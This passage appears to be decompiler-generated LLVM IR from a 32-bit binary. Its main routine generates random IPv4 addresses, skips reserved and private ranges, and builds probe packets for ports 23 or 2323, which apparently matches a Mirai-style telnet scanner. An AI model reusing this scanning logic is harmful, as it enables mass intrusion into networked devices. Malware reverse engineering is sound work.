  store i32 %v0_805026e, i32* %v3_8050273, align 4
  %v2_8050276 = ptrtoint i32* %stack_var_-20 to i32
  %v0_805027d = load i32, i32* @ebx, align 4
  %v1_805027d = add i32 %v0_805027d, 4
  %v2_805027d = inttoptr i32 %v1_805027d to i32*
  %v3_805027d = load i32, i32* %v2_805027d, align 4
  store i32 %v3_805027d, i32* %edx.global-to-local, align 4
  %v1_8050280 = add i32 %v0_805027d, 12
  %v2_8050280 = inttoptr i32 %v1_8050280 to i32*
  store i32 1, i32* %v2_8050280, align 4
  %v0_805028a = load i32, i32* %edx.global-to-local, align 4
  %v3_805028b = call i32 @function_80531da(i32 %v0_805028a, i32 %v2_8050276, i32 16)
  br label %dec_label_pc_8050293

dec_label_pc_8050293:                             ; preds = %dec_label_pc_805020a.dec_label_pc_8050293_crit_edge, %dec_label_pc_805021f
  %v0_8050297 = phi i32 [ 0, %dec_label_pc_805020a.dec_label_pc_8050293_crit_edge ], [ %v3_805028b, %dec_label_pc_805021f ]
  store i32 %v0_80501d0, i32* @ebx, align 4
  ret i32 %v0_8050297

; uselistorder directives
  uselistorder i32 %v3_80501f6, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_80526b0, { 11, 10, 7, 6, 9, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050293, { 1, 0 }
  uselistorder label %dec_label_pc_805020a, { 1, 0 }
}

define i32 @function_8050a41() local_unnamed_addr {
dec_label_pc_8050a41:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_8050f71

dec_label_pc_8050f71:                             ; preds = %dec_label_pc_8050f5b, %dec_label_pc_8050a41
  %v0_8050a41 = load i32, i32* @global_var_80572f0.34, align 16
  store i32 %v0_8050a41, i32* @esi, align 4
  %v0_8050a47 = load i32, i32* @esp, align 4
  %v1_8050a47 = add i32 %v0_8050a47, 24
  %v2_8050a47 = inttoptr i32 %v1_8050a47 to i32*
  %v3_8050a47 = load i32, i32* %v2_8050a47, align 4
  %v15_8050a47 = icmp eq i32 %v3_8050a47, %v0_8050a41
  br i1 %v15_8050a47, label %dec_label_pc_8050d00, label %dec_label_pc_8050a51

dec_label_pc_8050a51:                             ; preds = %dec_label_pc_8050f71
  %v1_8050a51 = add i32 %v0_8050a47, 1828
  store i32 %v1_8050a51, i32* @ebp, align 4
  %v1_8050a58 = add i32 %v0_8050a47, 1868
  %v2_8050a58 = inttoptr i32 %v1_8050a58 to i32*
  store i32 0, i32* %v2_8050a58, align 4
  %v0_8050c06.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050c06

dec_label_pc_8050a68:                             ; preds = %dec_label_pc_8050c7a
  %v11_8050a68 = icmp eq i8 %v2_8050c5d, -84
  br i1 %v11_8050a68, label %dec_label_pc_8050cc5, label %dec_label_pc_8050a71

dec_label_pc_8050a71:                             ; preds = %dec_label_pc_8050a68
  %v10_8050a71 = icmp eq i8 %v2_8050c5d, 100
  br i1 %v10_8050a71, label %dec_label_pc_8050a71.dec_label_pc_8050c91_crit_edge, label %dec_label_pc_8050a7a

dec_label_pc_8050a71.dec_label_pc_8050c91_crit_edge: ; preds = %dec_label_pc_8050a71
  %.pre = trunc i32 %v2_8050c54 to i8
  br label %dec_label_pc_8050c91

dec_label_pc_8050a7a:                             ; preds = %dec_label_pc_8050c88, %dec_label_pc_8050a71
  %v11_8050a7a = icmp eq i8 %v2_8050c5d, -87
  br i1 %v11_8050a7a, label %dec_label_pc_8050ce0, label %dec_label_pc_8050a83

dec_label_pc_8050a83:                             ; preds = %dec_label_pc_8050cd7, %dec_label_pc_8050a7a
  %v0_8050a83 = phi i32 [ %v0_8050cd7, %dec_label_pc_8050cd7 ], [ %v5_8050c52, %dec_label_pc_8050a7a ]
  %v0_8050b0b69 = phi i32 [ %v0_8050cce, %dec_label_pc_8050cd7 ], [ %v2_8050c54, %dec_label_pc_8050a7a ]
  %v1_8050a83 = trunc i32 %v0_8050a83 to i8
  %v11_8050a83 = icmp eq i8 %v1_8050a83, -58
  br i1 %v11_8050a83, label %dec_label_pc_8050ca8, label %dec_label_pc_8050a8c

dec_label_pc_8050a8c:                             ; preds = %dec_label_pc_8050ce0, %dec_label_pc_8050c9f, %dec_label_pc_8050a83
  %v0_8050a8c = phi i32 [ %v0_8050a8c76, %dec_label_pc_8050ce0 ], [ %v5_8050c52, %dec_label_pc_8050c9f ], [ %v0_8050a83, %dec_label_pc_8050a83 ]
  %v0_8050b0b68 = phi i32 [ %v0_8050ce0, %dec_label_pc_8050ce0 ], [ %v2_8050c54, %dec_label_pc_8050c9f ], [ %v0_8050b0b69, %dec_label_pc_8050a83 ]
  %v1_8050a8c = trunc i32 %v0_8050a8c to i8
  %tmp283 = icmp ult i8 %v1_8050a8c, -32
  br i1 %tmp283, label %dec_label_pc_8050a95, label %dec_label_pc_8050c47.preheader

dec_label_pc_8050a95:                             ; preds = %dec_label_pc_8050c91, %dec_label_pc_8050cc5.dec_label_pc_8050a95_crit_edge, %dec_label_pc_8050cb1, %dec_label_pc_8050a8c, %dec_label_pc_8050ca8
  %v0_8050b0b = phi i32 [ %v0_8050cce, %dec_label_pc_8050cc5.dec_label_pc_8050a95_crit_edge ], [ %v0_8050cb1, %dec_label_pc_8050cb1 ], [ %v0_8050b0b68, %dec_label_pc_8050a8c ], [ %v0_8050cb1, %dec_label_pc_8050ca8 ], [ %v2_8050c54, %dec_label_pc_8050c91 ]
  %v0_8050b19 = phi i32 [ %v0_8050a95.pre, %dec_label_pc_8050cc5.dec_label_pc_8050a95_crit_edge ], [ %v0_8050a9565, %dec_label_pc_8050cb1 ], [ %v0_8050a8c, %dec_label_pc_8050a8c ], [ %v0_8050a9565, %dec_label_pc_8050ca8 ], [ %v5_8050c52, %dec_label_pc_8050c91 ]
  %v1_8050a95 = add i32 %v0_8050b19, -6
  store i32 %v1_8050a95, i32* %eax.global-to-local, align 4
  %v1_8050a98 = trunc i32 %v1_8050a95 to i8
  %tmp284 = or i8 %v1_8050a98, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050aa0

dec_label_pc_8050aa0:                             ; preds = %dec_label_pc_8050a95
  %v1_8050aa0 = trunc i32 %v0_8050b19 to i8
  %v10_8050aa0 = icmp eq i8 %v1_8050aa0, 11
  br i1 %v10_8050aa0, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050aa9

dec_label_pc_8050aa9:                             ; preds = %dec_label_pc_8050aa0
  %v10_8050aa9 = icmp eq i8 %v1_8050aa0, 21
  br i1 %v10_8050aa9, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050ab2

dec_label_pc_8050ab2:                             ; preds = %dec_label_pc_8050aa9
  %v10_8050ab2 = icmp eq i8 %v1_8050aa0, 22
  br i1 %v10_8050ab2, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050abb

dec_label_pc_8050abb:                             ; preds = %dec_label_pc_8050ab2
  %v10_8050abb = icmp eq i8 %v1_8050aa0, 26
  br i1 %v10_8050abb, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050ac4

dec_label_pc_8050ac4:                             ; preds = %dec_label_pc_8050abb
  %v10_8050ac4 = icmp eq i8 %v1_8050aa0, 28
  br i1 %v10_8050ac4, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050acd

dec_label_pc_8050acd:                             ; preds = %dec_label_pc_8050ac4
  %v10_8050acd = icmp eq i8 %v1_8050aa0, 29
  br i1 %v10_8050acd, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050ad6

dec_label_pc_8050ad6:                             ; preds = %dec_label_pc_8050acd
  %v10_8050ad6 = icmp eq i8 %v1_8050aa0, 30
  br i1 %v10_8050ad6, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050adf

dec_label_pc_8050adf:                             ; preds = %dec_label_pc_8050ad6
  %v10_8050adf = icmp eq i8 %v1_8050aa0, 33
  br i1 %v10_8050adf, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050ae8

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050adf
  %v10_8050ae8 = icmp eq i8 %v1_8050aa0, 55
  br i1 %v10_8050ae8, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050af1

dec_label_pc_8050af1:                             ; preds = %dec_label_pc_8050ae8
  %v11_8050af1 = icmp eq i8 %v1_8050aa0, -42
  br i1 %v11_8050af1, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050afa

dec_label_pc_8050afa:                             ; preds = %dec_label_pc_8050af1
  %v11_8050afa = icmp eq i8 %v1_8050aa0, -41
  br i1 %v11_8050afa, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050b03

dec_label_pc_8050b03:                             ; preds = %dec_label_pc_8050afa
  %v0_8050b05 = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_80572ca.35 to i16*), align 4
  %v1_8050b0b = mul i32 %v0_8050b0b, 65536
  %v2_8050b16 = and i32 %v1_8050b0b, 16711680
  %v2_8050b19 = mul i32 %v0_8050b19, 16777216
  %v1_8050b05 = mul i32 %v0_8050b05, 256
  %v2_8050b1f = or i32 %v2_8050b16, %v2_8050b19
  %v0_8050b21 = load i32, i32* @edi, align 4
  %v1_8050b23 = urem i32 %v0_8050b21, 256
  store i32 %v1_8050b23, i32* %eax.global-to-local, align 4
  %v2_8050b28 = or i32 %v1_8050b23, %v2_8050b1f
  store i32 %v2_8050b28, i32* %ecx.global-to-local, align 4
  %v2_8050b2a = or i32 %v1_8050b23, %v1_8050b05
  %v1_8050b2c = load i32, i32* @esp, align 4
  %v2_8050b2c = add i32 %v1_8050b2c, -4
  %v3_8050b2c = inttoptr i32 %v2_8050b2c to i32*
  store i32 %v2_8050b28, i32* %v3_8050b2c, align 4
  %v1_8050b2d = trunc i32 %v2_8050b2a to i16
  %v2_8050b2d = call i16 @llvm.bswap.i16(i16 %v1_8050b2d)
  %v3_8050b2d = zext i16 %v2_8050b2d to i32
  %v1_8050b31 = udiv i32 %v2_8050b1f, 65536
  %v2_8050b31 = mul nuw i32 %v3_8050b2d, 65536
  %v1_8050b34 = trunc i32 %v1_8050b31 to i16
  %v2_8050b34 = call i16 @llvm.bswap.i16(i16 %v1_8050b34)
  %v3_8050b34 = zext i16 %v2_8050b34 to i32
  %v6_8050b34 = or i32 %v2_8050b31, %v3_8050b34
  store i32 %v6_8050b34, i32* %edx.global-to-local, align 4
  %v0_8050b38 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050b38 = add i32 %v1_8050b2c, -8
  %v3_8050b38 = inttoptr i32 %v2_8050b38 to i32*
  store i32 %v0_8050b38, i32* %v3_8050b38, align 4
  %v0_8050b39 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050b39, i32* @global_var_80572d0.36, align 16
  %v1_8050b3f = add i32 %v1_8050b2c, -12
  %v2_8050b3f = inttoptr i32 %v1_8050b3f to i32*
  store i32 20, i32* %v2_8050b3f, align 4
  %v1_8050b41 = add i32 %v1_8050b2c, -16
  %v2_8050b41 = inttoptr i32 %v1_8050b41 to i32*
  store i32 ptrtoint (i32* @global_var_80572c0.37 to i32), i32* %v2_8050b41, align 4
  %v0_8050b46 = call i32 @function_804de40()
  %v1_8050b46 = trunc i32 %v0_8050b46 to i16
  store i32 %v0_8050b46, i32* %eax.global-to-local, align 4
  %v0_8050b4b = load i32, i32* @esp, align 4
  %v1_8050b4b = add i32 %v0_8050b4b, 1884
  %v2_8050b4b = inttoptr i32 %v1_8050b4b to i32*
  %v3_8050b4b = load i32, i32* %v2_8050b4b, align 4
  store i16 %v1_8050b46, i16* bitcast (i32* @global_var_80572ca.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_8050b61 = ashr i32 %v3_8050b4b, 31
  %v2_8050b67 = zext i32 %v3_8050b4b to i64
  %v4_8050b67 = zext i32 %v2_8050b61 to i64
  %v5_8050b67 = mul nuw i64 %v4_8050b67, 4294967296
  %v6_8050b67 = or i64 %v5_8050b67, %v2_8050b67
  %v10_8050b67 = srem i64 %v6_8050b67, 10
  %v11_8050b67 = trunc i64 %v10_8050b67 to i32
  store i32 %v11_8050b67, i32* %edx.global-to-local, align 4
  %v1_8050b69 = icmp eq i32 %v11_8050b67, 0
  %v1_8050b6b = icmp eq i1 %v1_8050b69, false
  %. = select i1 %v1_8050b6b, i16 5888, i16 4873
  store i16 %., i16* @global_var_80572d6.38, align 2
  %v0_8050b7a = load i32, i32* @global_var_80572d0.36, align 16
  store i32 %v0_8050b7a, i32* %eax.global-to-local, align 4
  %v1_8050b7f = add i32 %v0_8050b4b, 12
  %v2_8050b7f = inttoptr i32 %v1_8050b7f to i32*
  store i32 20, i32* %v2_8050b7f, align 4
  %v0_8050b81 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050b81, i32* @global_var_80572d8.39, align 8
  %v1_8050b86 = add i32 %v0_8050b4b, 8
  %v2_8050b86 = inttoptr i32 %v1_8050b86 to i32*
  store i32 5120, i32* %v2_8050b86, align 4
  store i16 0, i16* bitcast (i32* @global_var_80572e4.40 to i16*), align 4
  %v1_8050b94 = add i32 %v0_8050b4b, 4
  %v2_8050b94 = inttoptr i32 %v1_8050b94 to i32*
  store i32 ptrtoint (i32* @global_var_80572d4.41 to i32), i32* %v2_8050b94, align 4
  %v2_8050b99 = inttoptr i32 %v0_8050b4b to i32*
  store i32 ptrtoint (i32* @global_var_80572c0.37 to i32), i32* %v2_8050b99, align 4
  %v0_8050b9e = call i32 @function_804de90()
  %v1_8050b9e = trunc i32 %v0_8050b9e to i16
  store i16 %v1_8050b9e, i16* bitcast (i32* @global_var_80572e4.40 to i16*), align 4
  %v0_8050ba9 = load i32, i32* @global_var_80572d0.36, align 16
  store i32 %v0_8050ba9, i32* %eax.global-to-local, align 4
  %v1_8050bae = load i32, i32* @esp, align 4
  %v2_8050bae = add i32 %v1_8050bae, 1848
  %v3_8050bae = inttoptr i32 %v2_8050bae to i32*
  store i32 %v0_8050ba9, i32* %v3_8050bae, align 4
  %v0_8050bb5 = load i16, i16* @global_var_80572d6.38, align 2
  %v1_8050bb5 = zext i16 %v0_8050bb5 to i32
  %v2_8050bb5 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050bb5 = and i32 %v2_8050bb5, -65536
  %v4_8050bb5 = or i32 %v3_8050bb5, %v1_8050bb5
  store i32 %v4_8050bb5, i32* %eax.global-to-local, align 4
  %v0_8050bbb = load i32, i32* @esp, align 4
  %v1_8050bbb = add i32 %v0_8050bbb, 1844
  %v2_8050bbb = inttoptr i32 %v1_8050bbb to i16*
  store i16 2, i16* %v2_8050bbb, align 2
  %v0_8050bc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bc5 = trunc i32 %v0_8050bc5 to i16
  %v2_8050bc5 = load i32, i32* @esp, align 4
  %v3_8050bc5 = add i32 %v2_8050bc5, 1846
  %v4_8050bc5 = inttoptr i32 %v3_8050bc5 to i16*
  store i16 %v1_8050bc5, i16* %v4_8050bc5, align 2
  %v0_8050bcd = load i32, i32* @esp, align 4
  %v1_8050bcd = inttoptr i32 %v0_8050bcd to i32*
  %v3_8050bcd = add i32 %v0_8050bcd, 4
  %v0_8050bce = load i32, i32* @global_var_805733c.42, align 4
  store i32 %v0_8050bce, i32* %eax.global-to-local, align 4
  %v1_8050bd3 = inttoptr i32 %v3_8050bcd to i32*
  %v2_8050bd3 = load i32, i32* %v1_8050bd3, align 4
  store i32 %v2_8050bd3, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_8050bd3, align 4
  %v0_8050bd6 = load i32, i32* @ebp, align 4
  store i32 %v0_8050bd6, i32* %v1_8050bcd, align 4
  %v1_8050bd7 = add i32 %v0_8050bcd, -4
  %v2_8050bd7 = inttoptr i32 %v1_8050bd7 to i32*
  store i32 16384, i32* %v2_8050bd7, align 4
  %v1_8050bdc = add i32 %v0_8050bcd, -8
  %v2_8050bdc = inttoptr i32 %v1_8050bdc to i32*
  store i32 40, i32* %v2_8050bdc, align 4
  %v1_8050bde = add i32 %v0_8050bcd, -12
  %v2_8050bde = inttoptr i32 %v1_8050bde to i32*
  store i32 ptrtoint (i32* @global_var_80572c0.37 to i32), i32* %v2_8050bde, align 4
  %v0_8050be3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050be3 = add i32 %v0_8050bcd, -16
  %v3_8050be3 = inttoptr i32 %v2_8050be3 to i32*
  store i32 %v0_8050be3, i32* %v3_8050be3, align 4
  %v0_8050be4 = call i32 @function_8053337()
  store i32 %v0_8050be4, i32* %eax.global-to-local, align 4
  %v0_8050be9 = load i32, i32* @esp, align 4
  %v1_8050be9 = add i32 %v0_8050be9, 1900
  %v2_8050be9 = inttoptr i32 %v1_8050be9 to i32*
  %v3_8050be9 = load i32, i32* %v2_8050be9, align 4
  %v1_8050bf0 = add i32 %v3_8050be9, 1
  store i32 %v1_8050bf0, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bf0, i32* %v2_8050be9, align 4
  %v0_8050bf8 = load i32, i32* @esp, align 4
  %v1_8050bf8 = add i32 %v0_8050bf8, 32
  %v0_8050bfb = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bfb = add i32 %v0_8050bfb, -383
  %v6_8050bfb = sub i32 382, %v0_8050bfb
  %v7_8050bfb = and i32 %v6_8050bfb, %v0_8050bfb
  %v8_8050bfb = icmp slt i32 %v7_8050bfb, 0
  %v9_8050bfb = icmp eq i32 %v1_8050bfb, 0
  %v10_8050bfb = icmp slt i32 %v1_8050bfb, 0
  %v3_8050c00 = icmp eq i1 %v10_8050bfb, %v8_8050bfb
  %v4_8050c00 = icmp eq i1 %v9_8050bfb, false
  %v5_8050c00 = and i1 %v4_8050c00, %v3_8050c00
  br i1 %v5_8050c00, label %dec_label_pc_8050cfc, label %dec_label_pc_8050c06

dec_label_pc_8050c06:                             ; preds = %dec_label_pc_8050b03, %dec_label_pc_8050a51
  %v0_8050c06 = phi i32 [ %v1_8050bf8, %dec_label_pc_8050b03 ], [ %v0_8050c06.pre, %dec_label_pc_8050a51 ]
  %v1_8050c06 = add i32 %v0_8050c06, 1828
  %v2_8050c06 = inttoptr i32 %v1_8050c06 to i32*
  store i32 0, i32* %v2_8050c06, align 4
  %v0_8050c11 = load i32, i32* @esp, align 4
  %v1_8050c11 = add i32 %v0_8050c11, 1832
  %v2_8050c11 = inttoptr i32 %v1_8050c11 to i32*
  store i32 0, i32* %v2_8050c11, align 4
  %v0_8050c1c = load i32, i32* @esp, align 4
  %v1_8050c1c = add i32 %v0_8050c1c, 1836
  %v2_8050c1c = inttoptr i32 %v1_8050c1c to i32*
  store i32 0, i32* %v2_8050c1c, align 4
  %v0_8050c27 = load i32, i32* @esp, align 4
  %v1_8050c27 = add i32 %v0_8050c27, 1840
  %v2_8050c27 = inttoptr i32 %v1_8050c27 to i32*
  store i32 0, i32* %v2_8050c27, align 4
  %v1_8050c32 = call i32 @function_804fa40(i32 ptrtoint (i32* @0 to i32))
  %v2_8050c32 = trunc i32 %v1_8050c32 to i16
  store i16 %v2_8050c32, i16* bitcast (i32* @global_var_80572c4.43 to i16*), align 4
  %v0_8050c3d = load i32, i32* @global_var_805731c.27, align 4
  store i32 %v0_8050c3d, i32* %eax.global-to-local, align 4
  store i32 %v0_8050c3d, i32* @global_var_80572cc.44, align 4
  br label %dec_label_pc_8050c47.preheader

dec_label_pc_8050c47.preheader:                   ; preds = %dec_label_pc_8050c06, %dec_label_pc_8050a95, %dec_label_pc_8050aa0, %dec_label_pc_8050aa9, %dec_label_pc_8050ab2, %dec_label_pc_8050abb, %dec_label_pc_8050ac4, %dec_label_pc_8050acd, %dec_label_pc_8050ad6, %dec_label_pc_8050adf, %dec_label_pc_8050ae8, %dec_label_pc_8050af1, %dec_label_pc_8050afa, %dec_label_pc_8050cb1, %dec_label_pc_8050cce, %dec_label_pc_8050a8c, %dec_label_pc_8050ce0
  br label %dec_label_pc_8050c47

dec_label_pc_8050c47:                             ; preds = %dec_label_pc_8050c9a, %dec_label_pc_8050c83, %dec_label_pc_8050c75, %dec_label_pc_8050c70, %dec_label_pc_8050c69, %dec_label_pc_8050c65, %dec_label_pc_8050c61, %dec_label_pc_8050c47, %dec_label_pc_8050c47.preheader
  %v1_8050c47 = call i32 @function_804fa40(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050c47, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_8050c47, 65536
  %v1_8050c4c = sdiv i32 %sext, 65536
  %v2_8050c52 = urem i32 %v1_8050c47, 256
  %v3_8050c52 = load i32, i32* @ecx, align 4
  %v4_8050c52 = and i32 %v3_8050c52, -256
  %v5_8050c52 = or i32 %v4_8050c52, %v2_8050c52
  store i32 %v5_8050c52, i32* @ecx, align 4
  %v2_8050c54 = udiv i32 %v1_8050c4c, 256
  store i32 %v2_8050c54, i32* @ebx, align 4
  %v2_8050c57 = udiv i32 %v1_8050c4c, 65536
  store i32 %v2_8050c57, i32* @edx, align 4
  %v2_8050c5a = udiv i32 %v1_8050c4c, 16777216
  store i32 %v2_8050c5a, i32* @edi, align 4
  %v2_8050c5d = trunc i32 %v1_8050c47 to i8
  %v11_8050c5d = icmp eq i8 %v2_8050c5d, 127
  br i1 %v11_8050c5d, label %dec_label_pc_8050c47, label %dec_label_pc_8050c61

dec_label_pc_8050c61:                             ; preds = %dec_label_pc_8050c47
  %v6_8050c61 = icmp eq i8 %v2_8050c5d, 0
  br i1 %v6_8050c61, label %dec_label_pc_8050c47, label %dec_label_pc_8050c65

dec_label_pc_8050c65:                             ; preds = %dec_label_pc_8050c61
  %v11_8050c65 = icmp eq i8 %v2_8050c5d, 3
  br i1 %v11_8050c65, label %dec_label_pc_8050c47, label %dec_label_pc_8050c69

dec_label_pc_8050c69:                             ; preds = %dec_label_pc_8050c65
  %v2_8050c69 = add nsw i32 %v1_8050c4c, -15
  store i32 %v2_8050c69, i32* %eax.global-to-local, align 4
  %v1_8050c6c = trunc i32 %v2_8050c69 to i8
  %tmp286 = or i8 %v1_8050c6c, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_8050c47, label %dec_label_pc_8050c70

dec_label_pc_8050c70:                             ; preds = %dec_label_pc_8050c69
  %v10_8050c70 = icmp eq i8 %v2_8050c5d, 56
  br i1 %v10_8050c70, label %dec_label_pc_8050c47, label %dec_label_pc_8050c75

dec_label_pc_8050c75:                             ; preds = %dec_label_pc_8050c70
  %v10_8050c75 = icmp eq i8 %v2_8050c5d, 10
  br i1 %v10_8050c75, label %dec_label_pc_8050c47, label %dec_label_pc_8050c7a

dec_label_pc_8050c7a:                             ; preds = %dec_label_pc_8050c75
  %v8_8050c7a = icmp eq i8 %v2_8050c5d, -64
  %v1_8050c7d = icmp eq i1 %v8_8050c7a, false
  br i1 %v1_8050c7d, label %dec_label_pc_8050a68, label %dec_label_pc_8050c83

dec_label_pc_8050c83:                             ; preds = %dec_label_pc_8050c7a
  %v1_8050c83 = trunc i32 %v2_8050c54 to i8
  %v11_8050c83 = icmp eq i8 %v1_8050c83, -88
  br i1 %v11_8050c83, label %dec_label_pc_8050c47, label %dec_label_pc_8050c88

dec_label_pc_8050c88:                             ; preds = %dec_label_pc_8050c83
  %v10_8050c88 = icmp eq i8 %v2_8050c5d, 100
  %v1_8050c8b = icmp eq i1 %v10_8050c88, false
  br i1 %v1_8050c8b, label %dec_label_pc_8050a7a, label %dec_label_pc_8050c91

dec_label_pc_8050c91:                             ; preds = %dec_label_pc_8050a71.dec_label_pc_8050c91_crit_edge, %dec_label_pc_8050c88
  %v1_8050c91.pre-phi = phi i8 [ %.pre, %dec_label_pc_8050a71.dec_label_pc_8050c91_crit_edge ], [ %v1_8050c83, %dec_label_pc_8050c88 ]
  %tmp288 = icmp ult i8 %v1_8050c91.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_8050a95, label %dec_label_pc_8050c9a

dec_label_pc_8050c9a:                             ; preds = %dec_label_pc_8050c91
  %tmp289 = icmp ult i8 %v1_8050c91.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_8050c47, label %dec_label_pc_8050c9f

dec_label_pc_8050c9f:                             ; preds = %dec_label_pc_8050c9a
  %v11_8050c9f = icmp eq i8 %v2_8050c5d, -58
  %v1_8050ca2 = icmp eq i1 %v11_8050c9f, false
  br i1 %v1_8050ca2, label %dec_label_pc_8050a8c, label %dec_label_pc_8050ca8

dec_label_pc_8050ca8:                             ; preds = %dec_label_pc_8050c9f, %dec_label_pc_8050a83
  %v0_8050cb1 = phi i32 [ %v2_8050c54, %dec_label_pc_8050c9f ], [ %v0_8050b0b69, %dec_label_pc_8050a83 ]
  %v0_8050a9565 = phi i32 [ %v5_8050c52, %dec_label_pc_8050c9f ], [ %v0_8050a83, %dec_label_pc_8050a83 ]
  %v1_8050ca8 = trunc i32 %v0_8050cb1 to i8
  %tmp290 = icmp ult i8 %v1_8050ca8, 18
  br i1 %tmp290, label %dec_label_pc_8050a95, label %dec_label_pc_8050cb1

dec_label_pc_8050cb1:                             ; preds = %dec_label_pc_8050ca8
  %tmp291 = or i8 %v1_8050ca8, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050a95

dec_label_pc_8050cbb:                             ; preds = %dec_label_pc_8051a65
  store i32 0, i32* %v2_8050cbe, align 4
  %v1_8050cc0 = call i32 @function_8054709(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050cc0, i32* %eax.global-to-local, align 4
  %v0_8050cc5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050cc5

dec_label_pc_8050cc5:                             ; preds = %dec_label_pc_8050a68, %dec_label_pc_8050cbb
  %v0_8050cce = phi i32 [ %v0_8050cc5.pre, %dec_label_pc_8050cbb ], [ %v2_8050c54, %dec_label_pc_8050a68 ]
  %v1_8050cc5 = trunc i32 %v0_8050cce to i8
  %tmp293 = icmp ult i8 %v1_8050cc5, 16
  br i1 %tmp293, label %dec_label_pc_8050cc5.dec_label_pc_8050a95_crit_edge, label %dec_label_pc_8050cce

dec_label_pc_8050cc5.dec_label_pc_8050a95_crit_edge: ; preds = %dec_label_pc_8050cc5
  %v0_8050a95.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050a95

dec_label_pc_8050cce:                             ; preds = %dec_label_pc_8050cc5
  %tmp294 = icmp ult i8 %v1_8050cc5, 32
  br i1 %tmp294, label %dec_label_pc_8050c47.preheader, label %dec_label_pc_8050cd7

dec_label_pc_8050cd7:                             ; preds = %dec_label_pc_8050cce
  %v0_8050cd7 = load i32, i32* @ecx, align 4
  %v1_8050cd7 = trunc i32 %v0_8050cd7 to i8
  %v11_8050cd7 = icmp eq i8 %v1_8050cd7, -87
  %v1_8050cda = icmp eq i1 %v11_8050cd7, false
  br i1 %v1_8050cda, label %dec_label_pc_8050a83, label %dec_label_pc_8050ce0

dec_label_pc_8050ce0:                             ; preds = %dec_label_pc_8050cd7, %dec_label_pc_8050a7a
  %v0_8050a8c76 = phi i32 [ %v0_8050cd7, %dec_label_pc_8050cd7 ], [ %v5_8050c52, %dec_label_pc_8050a7a ]
  %v0_8050ce0 = phi i32 [ %v0_8050cce, %dec_label_pc_8050cd7 ], [ %v2_8050c54, %dec_label_pc_8050a7a ]
  %v1_8050ce0 = trunc i32 %v0_8050ce0 to i8
  %v11_8050ce0 = icmp eq i8 %v1_8050ce0, -1
  %v1_8050ce3 = icmp eq i1 %v11_8050ce0, false
  br i1 %v1_8050ce3, label %dec_label_pc_8050a8c, label %dec_label_pc_8050c47.preheader

dec_label_pc_8050cfc:                             ; preds = %dec_label_pc_8050b03
  %v0_8050cfc = load i32, i32* @esi, align 4
  %v2_8050cfc = add i32 %v0_8050bf8, 56
  %v3_8050cfc = inttoptr i32 %v2_8050cfc to i32*
  store i32 %v0_8050cfc, i32* %v3_8050cfc, align 4
  br label %dec_label_pc_8050d00

dec_label_pc_8050d00:                             ; preds = %dec_label_pc_8050f71, %dec_label_pc_8050cfc
  %v1_8050d00 = call i32 @function_80530f9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050d00, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050d07 = load i32, i32* @esp, align 4
  %v2_8050d07 = add i32 %v1_8050d07, 40
  %v3_8050d07 = inttoptr i32 %v2_8050d07 to i32*
  store i32 %v1_8050d00, i32* %v3_8050d07, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050d0b:                             ; preds = %dec_label_pc_8050da8, %dec_label_pc_8050da0, %dec_label_pc_8050d98, %dec_label_pc_8050d90, %dec_label_pc_8050d84, %dec_label_pc_8050d78, %dec_label_pc_8050d71, %dec_label_pc_8050d5f, %dec_label_pc_8050d53, %dec_label_pc_8050d4e, %dec_label_pc_8050e0a, %dec_label_pc_8050d00
  %v0_8050d0b = load i32, i32* @esp, align 4
  %v1_8050d0b = add i32 %v0_8050d0b, 40
  %v2_8050d0b = inttoptr i32 %v1_8050d0b to i32*
  %v3_8050d0b = load i32, i32* %v2_8050d0b, align 4
  store i32 %v3_8050d0b, i32* %eax.global-to-local, align 4
  %v1_8050d0f = inttoptr i32 %v3_8050d0b to i32*
  store i32 0, i32* %v1_8050d0f, align 4
  %v0_8050d15 = load i32, i32* @edi, align 4
  %v1_8050d15 = load i32, i32* @esp, align 4
